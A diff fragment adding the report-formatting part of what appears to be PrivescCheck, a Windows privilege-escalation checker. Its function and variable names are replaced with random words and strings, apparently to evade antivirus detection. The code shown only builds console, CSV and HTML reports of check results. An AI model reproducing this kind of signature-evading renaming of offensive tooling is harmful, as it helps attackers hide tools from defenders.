+            if ($NAdaKwjF99.Length -gt 53) {
+                [void]$YEoRSTQC99.Add($GcBimCGN99)
+                $GcBimCGN99 = "$($_)"
+            } else {
+                $GcBimCGN99 = $NAdaKwjF99
+            }
+        }
+        if ($GcBimCGN99) {
+            [void]$YEoRSTQC99.Add($GcBimCGN99)
+        }
+        $YEoRSTQC99
+    }
+    $Title = "$($Check.Category.ToUpper()) > $($Check.DisplayName)"
+    if ($Title.Length -gt 46) {
+        throw "Input title is too long."
+    }
+    $XwsMixSg99 = ""
+    $XwsMixSg99 += "+------+------------------------------------------------+------+`r`n"
+    $XwsMixSg99 += "| TEST | $Title$(' '*(46 - $Title.Length)) | $($Check.Type.ToUpper()) |`r`n"
+    $XwsMixSg99 += "+------+------------------------------------------------+------+`r`n"
+    programmables -SSwKgPSl99 $Check.Description | ForEach-Object {
+        $XwsMixSg99 += "| $(if ($Flag) { '    ' } else { 'DESC'; $Flag = $True }) | $($_)$(' '*(53 - ([string]$_).Length)) |`r`n"
+    }
+    $XwsMixSg99 += "+------+-------------------------------------------------------+"
+    $XwsMixSg99
+}
+function regulatory {
+    [CmdletBinding()] param(
+        [object]$qUUxywoq99
+    )
+    if ($qUUxywoq99.ResultRaw) {
+            
+        "[*] Found $(([object[]]$qUUxywoq99.ResultRaw).Length) result(s)."
+        if ($qUUxywoq99.Format -eq "Table") {
+            $qUUxywoq99.ResultRaw | Format-Table -AutoSize
+        } elseif ($qUUxywoq99.Format -eq "List") {
+            $qUUxywoq99.ResultRaw | Format-List
+        }
+        
+    } else {
+        if ($qUUxywoq99.Type -eq "Vuln") {
+            "[!] Not vulnerable."
+        } else {
+            "[!] Nothing found."
+        }
+    }
+    "`r`n"
+}
+function operative {
+    [CmdletBinding()] param(
+        [object[]]$cDPKmtBg99
+    )
+    $cDPKmtBg99 | ForEach-Object {
+        sunbonnets -Check $_
+        regulatory -qUUxywoq99 $_
+    }
+}
+function hairstylist {
+    [CmdletBinding()] param(
+        [object[]]$cDPKmtBg99
+    )
+    
+    $cDPKmtBg99 | Sort-Object -Property "Category" | Select-Object "Category","DisplayName","Description","Compliance","Severity","ResultRawString" | ConvertTo-Csv -NoTypeInformation
+}
+function spiced {
+    [CmdletBinding()] param(
+        [object[]]$cDPKmtBg99
+    )
+    $xQjcfTdu99 = @"
+var cells = document.getElementsByTagName('td');
+for (var i=0; i<cells.length; i++) {
+    if (cells[i].innerHTML == "True") {
+        cells[i].style.backgroundColor = '#ff5050';
+    } else if(cells[i].innerHTML == "False") {
+        cells[i].style.backgroundColor = '#00ff99';
+    } else if (cells[i].innerHTML == "Low") {
+      cells[i].innerHTML = "<span class=\"label low\">Low</span>"
+    } else if (cells[i].innerHTML == "Medium") {
+      cells[i].innerHTML = "<span class=\"label medium\">Medium</span>"
+    } else if (cells[i].innerHTML == "High") {
+      cells[i].innerHTML = "<span class=\"label high\">High</span>"
+    } else if (cells[i].innerHTML == "Info") {
+      cells[i].innerHTML = "<span class=\"label info\">Info</span>"
+    } else if (cells[i].innerHTML == "None") {
+        cells[i].innerHTML = "<span class=\"label other\">None</span>"
+    } else if (cells[i].innerHTML == "OK") {
+        cells[i].innerHTML = "<span class=\"label low\">OK</span>"
+    } else if (cells[i].innerHTML == "KO") {
+        cells[i].innerHTML = "<span class=\"label high\">KO</span>"
+    } else if (cells[i].innerHTML == "N/A") {
+        cells[i].innerHTML = "<span class=\"label other\">N/A</span>"
+    }
+    
+    // If a cell is too large, we need to make it scrollable. But 'td' elements are not 
+    // scrollable so, we need make it a 'div' first and apply the 'scroll' (c.f. CSS) style to make
+    // it scrollabale.
+    if (cells[i].offsetHeight > 200) {
+        cells[i].innerHTML = "<div class=\"scroll\">" + cells[i].innerHTML + "</div>";
+        console.log("Cells height is greater than 200");
+    }
+}
+"@
+    $Css = @"
+body {
+    font:1.2em normal Arial,sans-serif;
+    color:#34495E;
+    }
+      
+h1 {
+    text-align:center;
+    text-transform:uppercase;
+    letter-spacing:-2px;
+    font-size:2.5em;
+    margin:20px 0;
+}
+      
+table {
+    border-collapse:collapse;
+    width:100%;
+    border:2px solid #6699ff;
+}
+      
+th {
+    color:white;
+    background:#6699ff;
+    text-align:center;
+    padding:5px 0;
+}
+td {
+    text-align:center;
+    padding:5px 5px 5px 5px;
+}
+tbody td:nth-child(3) {
+    text-align:left;
+}
+/* Render output results with 'pre' style */
+tbody td:nth-child(6) {
+    white-space: pre;
+    margin: 1em 0px;
+    padding: .2rem .4rem;
+    font-size: 87.5%;
+    font-family: SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace;
+    text-align:left;
+}
+      
+tbody tr:nth-child(even) {
+    background:#ECF0F1;
+}
+      
+tbody tr:hover {
+    background:#BDC3C7;
+    color:#FFFFFF;
+}
+.scroll {
+    max-height: 200px;
+    overflow: auto;
+}
+.label {
+    margin: 8px;
+    padding: 6px;
+    display: block;
+    width: 60px;
+    border-radius: 5px;
+}
+.low {background-color: #4CAF50;} /* Green */
+.info {background-color: #2196F3;} /* Blue */
+.medium {background-color: #ff9800;} /* Orange */
+.high {background-color: #f44336;} /* Red */
+.other {background-color: #cccccc;} /* Gray */
+"@
+    $Html = @"
+<html>
+<head>
+<style>
+$($Css)
+</style>
+</head>
+<body>
+BODY_TO_REPLACE
+<script>
+$($xQjcfTdu99)
+</script>
+</body>
+</html>
+"@
+    $gVudwfZR99 = $cDPKmtBg99 | Sort-Object -Property "Category" | ConvertTo-Html -Property "Category","DisplayName","Description","Compliance","Severity","ResultRawString" -Fragment  
+    $Html = $Html.Replace("BODY_TO_REPLACE", $gVudwfZR99)
+    $Html
+}
+function nosiness {
+    [CmdletBinding()] param(
+        
+    )
+    Write-Host "+-----------------------------------------------------------------------------+"
+    Write-Host "|                         ~~~ PrivescCheck Report ~~~                         |"
+    Write-Host "+----+------+-----------------------------------------------------------------+"
+    $bCYKJBek99 | Sort-Object -Property Category | ForEach-Object {
+        Write-Host -NoNewline "| "
+        if ($_.Type -Like "vuln") {
+            if ($_.ResultRaw) {
+                Write-Host -NoNewline -ForegroundColor "Red" "KO"
+            } else {
+                Write-Host -NoNewline -ForegroundColor "Green" "OK"
+            }
+        } else {
+            Write-Host -NoNewline -ForegroundColor "DarkGray" "NA"
+        }
+        Write-Host -NoNewline " | "
+        if ($_.Severity -Like "None") {
+            $DFToUeqh99 = "DarkGray"
+            Write-Host -NoNewline -ForegroundColor $DFToUeqh99 "None"
+        } elseif ($_.Severity -Like "Low") {
+            $DFToUeqh99 = "DarkGreen"
+            Write-Host -NoNewline -ForegroundColor $DFToUeqh99 "Low "
+        } elseif ($_.Severity -Like "Medium") {
+            $DFToUeqh99 = "DarkYellow"
+            Write-Host -NoNewline -ForegroundColor $DFToUeqh99 "Med."
+        } elseif ($_.Severity -Like "High") {
+            $DFToUeqh99 = "DarkRed"
+            Write-Host -NoNewline -ForegroundColor $DFToUeqh99 "High"
+        } elseif ($_.Severity -Like "Info") {
+            $DFToUeqh99 = "DarkBlue"
+            Write-Host -NoNewline -ForegroundColor $DFToUeqh99 "Info"
+        } else {
+            $DFToUeqh99 = "White"
+            Write-Host -NoNewline "    "
+        }
+        Write-Host -NoNewline " |"
+        $YkxdYNBo99 = "$($_.Category.ToUpper()) > $($_.DisplayName)"
+        if ($_.ResultRaw) {
+            $YkxdYNBo99 = "$($YkxdYNBo99) -> $(([object[]]$_.ResultRaw).Length) result(s)"
+        }
+        $WqZZKbyX99 = ' ' * $(63 - $YkxdYNBo99.Length)
+        Write-Host -NoNewline " $($_.Category.ToUpper()) > $($_.DisplayName)"
+        
+        if ($_.ResultRaw) {
+            Write-Host -NoNewLine " ->"
+            Write-Host -NoNewLine -ForegroundColor $DFToUeqh99 " $(([object[]]$_.ResultRaw).Length) result(s)"
+        }
+        
+        Write-Host "$($WqZZKbyX99) |"
+    }
+    Write-Host "+----+------+-----------------------------------------------------------------+"
+}
